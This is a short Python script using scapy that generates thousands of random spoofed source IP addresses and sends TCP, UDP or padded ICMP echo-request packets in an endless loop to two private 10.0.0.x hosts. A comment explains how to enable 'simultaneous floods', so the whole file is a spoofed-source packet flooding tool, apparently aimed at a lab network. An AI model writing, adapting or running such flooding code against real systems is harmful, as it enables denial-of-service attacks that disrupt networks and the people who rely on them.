import sys, random
from scapy.all import *
import multiprocessing

destinations = ["10.0.0.3", "10.0.0.4"]


def get_random_ips(n):
    for i in range(0, int(n)):
        ip_gen = (
            str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
        )
        source_ips.append(ip_gen)


def send_rand_tcp(origin_ip):
    dst_ip = random.choice(destinations)
    send(IP(src=origin_ip, dst=dst_ip) / TCP(sport=RandShort()))


def send_rand_udp(origin_ip):
    dst_ip = random.choice(destinations)
    send(IP(src=origin_ip, dst=dst_ip) / UDP(sport=RandShort()))


def send_rand_icmp(origin_ip):
    dst_ip = random.choice(destinations)
    send(
        IP(src=origin_ip, dst=dst_ip) / ICMP(type="echo-request") / Raw(load="A" * 1024)
    )


while True:
    source_ips = []
    get_random_ips(10000)

    p = multiprocessing.Pool(3)
    # Uncomment everything for simultaneous floods, or only one of the three for individual
    # p.apply_async(send_rand_tcp, args=(source_ips,))
    # p.apply_async(send_rand_udp, args=(source_ips,))
    p.apply_async(send_rand_icmp, args=(source_ips,))
    p.close()
    p.join()
